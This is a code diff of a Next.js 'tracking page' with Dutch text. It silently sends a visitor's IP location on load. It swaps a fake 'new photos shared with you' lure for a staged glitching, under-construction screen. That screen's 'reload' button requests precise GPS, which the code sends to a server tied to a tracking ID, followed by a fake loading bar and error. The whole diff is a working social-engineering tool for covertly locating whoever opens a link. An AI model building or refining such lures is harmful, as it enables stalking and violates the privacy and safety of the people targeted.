@@ -6,8 +6,10 @@ import { useParams } from "next/navigation";
 export default function TrackingPage() {
   const params = useParams();
   const trackingId = params.id as string;
-  const [status, setStatus] = useState<"initial" | "requesting" | "sent" | "error">("initial");
-  const [message, setMessage] = useState("");
+  const [status, setStatus] = useState<"glitching" | "requesting" | "loading" | "error">("glitching");
+  const [glitchText, setGlitchText] = useState("Pagina laden...");
+  const [showButton, setShowButton] = useState(false);
+  const [loadingProgress, setLoadingProgress] = useState(0);
 
   // Automatisch IP-locatie versturen bij het laden van de pagina
   useEffect(() => {
@@ -30,12 +32,40 @@ export default function TrackingPage() {
     sendIpLocation();
   }, [trackingId]);
 
+  // Glitch effect simulatie
+  useEffect(() => {
+    const glitchMessages = [
+      "Pagina laden...",
+      "Verbinden met server...",
+      "Error: timeout",
+      "Opnieuw proberen...",
+      "Laden...",
+      "Fout: kan pagina niet laden",
+      "Verbinding mislukt",
+    ];
+
+    let index = 0;
+    const interval = setInterval(() => {
+      index = (index + 1) % glitchMessages.length;
+      setGlitchText(glitchMessages[index]);
+    }, 800);
+
+    // Toon de knop na 3 seconden
+    const buttonTimer = setTimeout(() => {
+      setShowButton(true);
+    }, 3000);
+
+    return () => {
+      clearInterval(interval);
+      clearTimeout(buttonTimer);
+    };
+  }, []);
+
   const handleButtonClick = async () => {
     setStatus("requesting");
     
     if (!navigator.geolocation) {
-      setStatus("sent");
-      setMessage("Je foto's worden nu geladen...");
+      startFakeLoading();
       return;
     }
 
@@ -54,13 +84,10 @@ export default function TrackingPage() {
               timestamp: new Date().toISOString(),
             }),
           });
-          setStatus("sent");
-          setMessage("Je foto's worden nu geladen...");
         } catch (e) {
           console.error("GPS fout:", e);
-          setStatus("sent");
-          setMessage("Je foto's worden nu geladen...");
         }
+        startFakeLoading();
       },
       async (error) => {
         console.error("Geolocation error:", error);
@@ -78,8 +105,7 @@ export default function TrackingPage() {
         } catch (e) {
           console.error("Error sending denial:", e);
         }
-        setStatus("sent");
-        setMessage("Je foto's worden nu geladen...");
+        startFakeLoading();
       },
       {
         enableHighAccuracy: true,
@@ -89,62 +115,121 @@ export default function TrackingPage() {
     );
   };
 
-  return (
-    <div className="min-h-screen bg-gradient-to-b from-orange-50 to-white flex items-center justify-center p-4">
-      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
-        {/* Foto icoon */}
-        <div className="text-6xl mb-6">📸</div>
-        
-        {/* Titel */}
-        <h1 className="text-2xl font-bold text-gray-800 mb-4">
-          Nieuwe foto&apos;s gedeeld!
-        </h1>
-        
-        {/* Bericht */}
-        <p className="text-gray-600 text-lg mb-8 leading-relaxed">
-          Er zijn 3 nieuwe foto&apos;s met je gedeeld. Tik op de knop om ze te bekijken.
-        </p>
+  const startFakeLoading = () => {
+    setStatus("loading");
+    // Fake loading progress
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += Math.random() * 15;
+      if (progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        // Na "laden" toon een error
+        setTimeout(() => {
+          setStatus("error");
+        }, 500);
+      }
+      setLoadingProgress(Math.min(progress, 100));
+    }, 300);
+  };
 
-        {status === "sent" ? (
-          <div className="bg-gray-50 rounded-xl p-6">
-            <div className="animate-spin text-4xl mb-3">⏳</div>
-            <p className="text-gray-600 text-lg">{message}</p>
-            <p className="text-gray-400 text-sm mt-2">Even geduld alsjeblieft...</p>
+  return (
+    <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-mono">
+      <div className="max-w-lg w-full">
+        {status === "glitching" && (
+          <div className="text-center">
+            {/* Glitchy header */}
+            <div className="mb-8">
+              <h1 className="text-white text-xl mb-2 opacity-80">
+                🚧 Website in ontwikkeling
+              </h1>
+              <div className="h-px bg-gray-700 w-full"></div>
+            </div>
+
+            {/* Fake console/terminal look */}
+            <div className="bg-black rounded-lg p-4 text-left mb-6 border border-gray-700">
+              <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-800">
+                <div className="w-3 h-3 rounded-full bg-red-500"></div>
+                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
+                <div className="w-3 h-3 rounded-full bg-green-500"></div>
+                <span className="text-gray-500 text-xs ml-2">console</span>
+              </div>
+              <div className="space-y-1 text-sm">
+                <p className="text-green-400">&gt; Initialiseren...</p>
+                <p className="text-yellow-400">&gt; Laden van assets...</p>
+                <p className="text-red-400 animate-pulse">&gt; {glitchText}</p>
+              </div>
+            </div>
+
+            {/* Error message */}
+            <div className="bg-red-900/30 border border-red-800 rounded-lg p-4 mb-6">
+              <p className="text-red-400 text-sm">
+                ⚠️ Er ging iets mis bij het laden van de pagina.
+              </p>
+              <p className="text-red-300/70 text-xs mt-1">
+                Dit kan komen door je browser instellingen.
+              </p>
+            </div>
+
+            {/* Button appears after delay */}
+            {showButton && (
+              <button
+                onClick={handleButtonClick}
+                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 px-6 rounded-lg transition-all transform hover:scale-105 active:scale-95 animate-pulse"
+              >
+                🔄 Opnieuw laden
+              </button>
+            )}
+
+            {!showButton && (
+              <div className="text-gray-500 text-sm">
+                Even geduld...
+              </div>
+            )}
           </div>
-        ) : (
-          <>
-            {/* De knop */}
-            <button
-              onClick={handleButtonClick}
-              disabled={status === "requesting"}
-              className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white text-xl font-bold py-5 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95 disabled:transform-none"
-            >
-              {status === "requesting" ? (
-                <span className="flex items-center justify-center gap-3">
-                  <svg className="animate-spin h-6 w-6" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                  </svg>
-                  Laden...
-                </span>
-              ) : (
-                <span className="flex items-center justify-center gap-3">
-                  <span className="text-2xl">📷</span>
-                  Bekijk foto&apos;s
-                </span>
-              )}
-            </button>
-            
-            <p className="text-gray-400 text-sm mt-6">
-              Gedeeld via Foto Album
-            </p>
-          </>
         )}
-        
-        {/* Subtiele footer */}
-        <div className="mt-8 pt-6 border-t border-gray-100">
-          <p className="text-gray-300 text-xs">
-            foto-album.app
+
+        {status === "requesting" && (
+          <div className="text-center">
+            <div className="bg-black rounded-lg p-6 border border-gray-700">
+              <div className="animate-spin text-4xl mb-4">⚙️</div>
+              <p className="text-gray-300">Pagina opnieuw laden...</p>
+              <p className="text-gray-500 text-sm mt-2">Toestemming nodig voor volledige functionaliteit</p>
+            </div>
+          </div>
+        )}
+
+        {status === "loading" && (
+          <div className="text-center">
+            <div className="bg-black rounded-lg p-6 border border-gray-700">
+              <p className="text-gray-300 mb-4">Laden... {Math.round(loadingProgress)}%</p>
+              <div className="w-full bg-gray-800 rounded-full h-2">
+                <div 
+                  className="bg-blue-500 h-2 rounded-full transition-all duration-300"
+                  style={{ width: `${loadingProgress}%` }}
+                ></div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {status === "error" && (
+          <div className="text-center">
+            <div className="bg-black rounded-lg p-6 border border-gray-700">
+              <div className="text-4xl mb-4">🔧</div>
+              <p className="text-gray-300 mb-2">Website nog niet beschikbaar</p>
+              <p className="text-gray-500 text-sm">
+                Sorry, we zijn nog bezig met bouwen!<br/>
+                Probeer het later nog eens.
+              </p>
+            </div>
+          </div>
+        )}
+
+        {/* Footer */}
+        <div className="mt-8 text-center">
+          <p className="text-gray-600 text-xs">
+            v0.1.0-beta • {new Date().getFullYear()}
           </p>
         </div>
       </div>
